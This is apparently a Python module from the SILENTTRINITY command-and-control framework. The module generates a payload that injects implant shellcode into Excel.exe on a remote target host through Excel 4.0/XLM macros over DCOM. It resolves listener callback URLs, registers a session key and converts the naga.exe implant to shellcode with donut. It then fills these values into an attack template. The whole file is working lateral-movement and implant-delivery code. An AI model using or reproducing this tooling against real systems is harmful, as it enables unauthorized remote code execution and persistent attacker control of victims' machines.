import donut
import uuid
from silenttrinity.core.events import Events
from silenttrinity.core.teamserver import ipc_server
from silenttrinity.core.teamserver.crypto import gen_stager_psk
from silenttrinity.core.utils import shellcode_to_hex_byte_array, print_bad, get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/excel4dcom'
        self.language = 'boo'
        self.description = 'Injects SILENTTRINITY shellcode directly into Excel.exe using Excel 4.0 / XLM Macros'
        self.run_in_thread = False
        self.author = '@rvrsh3ll (Original C# version), @byt3bl33d3r (Boolang port)'
        self.references = []
        self.options = {
            'Listener': {
                'Description'   :   'Listener to use',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Target' : {
                'Description'   :   'Target host',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Architecture' : {
                'Description'   :   'MS Office installation architecture (x64 or x86) [Warning: getting this wrong will crash things]',
                'Required'      :   False,
                'Value'         :   'x64'
            }
        }
            #'Process': {
            #    'Description'   :   'Process to inject into',
            #    'Required'      :   False,
            #    'Value'         :   'explorer'
            #},
            #'InjectionMethod': {
            #    'Description'   :   'Injection Method',
            #    'Required'      :   False,
            #    'Value'         :   'InjectRemote'
            #}

    def payload(self):
        listener = ipc_server.publish_event(Events.GET_LISTENERS, (self.options['Listener']['Value'],))
        if listener:
            c2_urls = ','.join(
                filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
            )

            guid = uuid.uuid4()
            psk = gen_stager_psk()
            ipc_server.publish_event(Events.SESSION_REGISTER, (guid, psk))

            donut_shellcode = donut.create(file=get_path_in_package('core/teamserver/data/naga.exe'), params=f"{guid};{psk};{c2_urls}", arch=2 if self.options['Architecture']['Value'] == 'x64' else 1)
            shellcode = shellcode_to_hex_byte_array(donut_shellcode)
            with open(get_path_in_package('core/teamserver/modules/boo/src/excel4dcom.boo')) as module_src:
                src = module_src.read()
                src = src.replace('SHELLCODE', shellcode)
                src = src.replace('TARGET', self.options['Target']['Value'])
                src = src.replace('ARCH', self.options['Architecture']['Value'])
                return src
        else:
            print_bad(f"Listener '{self.options['Listener']['Value']}' not found!")
